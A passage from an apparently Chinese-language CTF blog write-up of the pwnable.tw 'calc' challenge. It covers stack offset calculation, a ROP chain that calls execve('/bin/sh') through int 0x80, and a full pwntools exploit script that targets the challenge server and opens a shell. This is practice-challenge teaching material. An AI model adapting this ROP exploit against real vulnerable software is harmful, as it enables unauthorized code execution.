<p>发现：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-5ca5627ce3ac26e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="NX"><br>这里开启了NX保护<br>我们无法在栈上执行shellcode拿到shell<br>同时看到这里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R .&#x2F;clac</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/7434375-73c54c4f8e7a913a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>程序是静态链接<br>我们这里考虑利用ROP调用sys_execve来获得shell</p>
<h4 id="0x03-ROP"><a href="#0x03-ROP" class="headerlink" title="0x03 ROP"></a>0x03 ROP</h4><p>首先计算出返回地址与*a2的距离</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x5A0+0x4&#x3D;1444</span><br><span class="line">1444&#x2F;4&#x3D;361</span><br></pre></td></tr></table></figure>
<p>故而:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入+361时反回的即时calc的返回地址</span><br><span class="line">我们需要连续修改a2[361]后的一段栈内数据来构造ROP链</span><br></pre></td></tr></table></figure>
<p>我们最终需要：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebx&#x3D;“&#x2F;bin&#x2F;sh”字符串首地址</span><br><span class="line">ecx&#x3D;0</span><br><span class="line">eax&#x3D;0xb</span><br></pre></td></tr></table></figure>
<p>我们需要构造一段栈内数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr(pop eax;ret)-&gt;0xb-&gt;addr(pop ecx;popebx,ret)-&gt;0-&gt;addr&quot;&#x2F;bin&#x2F;sh&quot;-&gt;addr(int 80h)-&gt;&quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>
<p>利用ROPgadget找到我们需要指令的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary .&#x2F;calc  --ropchain</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/7434375-d8544bc80e94eab2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ROPgadget"><br>下面：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">我们需要先通过找到栈中对应位置的值计算出我们需要的差值</span><br><span class="line">利用差值将从返回地址开始的一段栈数据修改成我们需要的值</span><br><span class="line">例如：</span><br><span class="line">我们先修改+361处的值</span><br><span class="line">+361处需要修改为addr(pop eax;ret)（pop eax;ret指令地址）</span><br><span class="line">假设pop eax;ret指令地址为：0x1</span><br><span class="line">我们输入&quot;+361&quot;，返回：0x0</span><br><span class="line">它与我们需要的值差值为0x1-0x0&#x3D;1</span><br><span class="line">我们输入+361+1</span><br><span class="line">即可修改+361处值为我们需要的0x1</span><br></pre></td></tr></table></figure>
<p>注意：<br><strong>其中/bin/sh字符串我们只知道其在栈中的相对地址，这里需要我们先取得main函数的ebp地址（我们取得+360(main函数基地址)是负数，需要+0x100000000转换后运算，再在最后-0x100000000修改对应位置值）</strong></p>
<p>在main中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">sub     esp, 10h</span><br></pre></td></tr></table></figure>
<p>故而返回地址即在：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr_re&#x3D;([ebp]&amp;0xfffffff0)-16   #注意脚本书写时运算优先级&quot;+&quot;&gt;&quot;&amp;&quot;</span><br></pre></td></tr></table></figure>
<p><strong>而后再根据我们最后在栈内构造的字符串”/bin/sh”与返回地址的相对位置计算出字符串”/bin/sh”的地址即可</strong></p>
<h4 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&#39;chall.pwnable.tw&#39;,10100)</span><br><span class="line">#p&#x3D;process(&quot;.&#x2F;calc&quot;)</span><br><span class="line">key&#x3D;[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;+360&#39;)</span><br><span class="line">addr_bp&#x3D;int(p.recv())</span><br><span class="line">addr_re&#x3D;((addr_bp+0x100000000)&amp;0xFFFFFFF0)-16</span><br><span class="line">addr_str&#x3D;addr_re+20-0x100000000</span><br><span class="line">addr&#x3D;361</span><br><span class="line">for i in range(5):</span><br><span class="line">      p.sendline(&#39;+&#39;+str(addr+i))</span><br><span class="line">      ans&#x3D;int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans&#x3D;ans-key[i]</span><br><span class="line">             p.sendline(&#39;+&#39;+str(addr+i)+&#39;-&#39;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans&#x3D;key[i]-ans</span><br><span class="line">          p.sendline(&#39;+&#39;+str(addr+i)+&#39;+&#39;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.sendline(&#39;+&#39;+&#39;365&#39;+str(addr_str))</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(5,8):</span><br><span class="line">      p.sendline(&#39;+&#39;+str(addr+i))</span><br><span class="line">      ans&#x3D;int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans&#x3D;ans-key[i]</span><br><span class="line">             p.sendline(&#39;+&#39;+str(addr+i)+&#39;-&#39;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans&#x3D;key[i]-ans</span><br><span class="line">          p.sendline(&#39;+&#39;+str(addr+i)+&#39;+&#39;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.send(&#39;kirin&#39;+&#39;\n&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-tw-challenge-calc"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw_challenge_calc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-程序过程"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 程序过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-main"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x01 main</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-calc"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x02 calc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#0x01-canary保护"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">0x01 canary保护</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x02-bzero"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">0x02 _bzero</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x03-get-expr"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">0x03 get_expr</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x04-init-pool"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">0x04  init_pool</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x05-parse-expr"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">0x05  parse_expr</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">0x02  漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-ROP"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 ROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-EXP"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 EXP</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/06/03/pwnable-tw-calc/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&text=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&is_video=false&description=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=pwnable.tw_calc&body=Check out this article: http://yoursite.com/2018/06/03/pwnable-tw-calc/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&name=pwnable.tw_calc&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


